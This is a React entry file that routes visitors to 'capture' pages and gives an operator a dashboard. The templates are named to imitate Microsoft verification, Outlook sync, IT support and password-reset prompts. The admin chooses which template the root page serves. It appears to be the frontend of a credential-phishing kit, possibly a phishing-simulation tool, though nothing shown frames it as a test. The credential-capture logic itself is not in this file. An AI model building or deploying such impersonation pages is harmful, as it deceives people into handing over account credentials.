import React, { useState, useEffect } from 'react';
import ReactDOM from 'react-dom/client';
import { Dashboard } from './components/Dashboard';
import { CapturePage } from './components/CapturePage';
import { ScheduleCapturePage } from './components/ScheduleCapturePage';
import { MicrosoftVerifyTemplate } from './components/templates/MicrosoftVerifyTemplate';
import { OutlookSyncTemplate } from './components/templates/OutlookSyncTemplate';
import { ITSupportTemplate } from './components/templates/ITSupportTemplate';
import { PasswordResetTemplate } from './components/templates/PasswordResetTemplate';
import './styles/dashboard.css';
import './styles/capture.css';

type PageDesign = 'default' | 'microsoft-verify' | 'outlook-sync' | 'schedule-meeting' | 'it-support' | 'password-reset';

function PageRenderer({ design }: { design: PageDesign }): React.ReactElement {
  switch (design) {
    case 'microsoft-verify': return <MicrosoftVerifyTemplate />;
    case 'outlook-sync': return <OutlookSyncTemplate />;
    case 'schedule-meeting': return <ScheduleCapturePage />;
    case 'it-support': return <ITSupportTemplate />;
    case 'password-reset': return <PasswordResetTemplate />;
    default: return <CapturePage />;
  }
}

function App(): React.ReactElement {
  const [path, setPath] = useState(window.location.pathname);
  const [activePage, setActivePage] = useState<PageDesign | null>(null);
  const [loaded, setLoaded] = useState(false);

  useEffect(() => {
    function onPopState(): void {
      setPath(window.location.pathname);
    }
    window.addEventListener('popstate', onPopState);
    return () => window.removeEventListener('popstate', onPopState);
  }, []);

  useEffect(() => {
    if (path === '/' || path.startsWith('/preview/')) {
      fetch('/api/templates?public=true')
        .then(r => r.json())
        .then((data: { template?: string }) => {
          setActivePage((data.template as PageDesign) ?? 'default');
          setLoaded(true);
        })
        .catch(() => { setActivePage('default'); setLoaded(true); });
    } else {
      setLoaded(true);
    }
  }, [path]);

  if (path === '/admin' || path.startsWith('/admin/')) {
    return <Dashboard />;
  }

  // Preview routes
  if (path.startsWith('/preview/')) {
    const design = path.replace('/preview/', '').replace(/\/$/, '') as PageDesign;
    return <PageRenderer design={design} />;
  }

  if (!loaded) {
    return <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh' }}>
      <div className="capture-spinner" />
    </div>;
  }

  return <PageRenderer design={activePage ?? 'default'} />;
}

ReactDOM.createRoot(document.getElementById('root')!).render(
  <React.StrictMode>
    <App />
  </React.StrictMode>
);
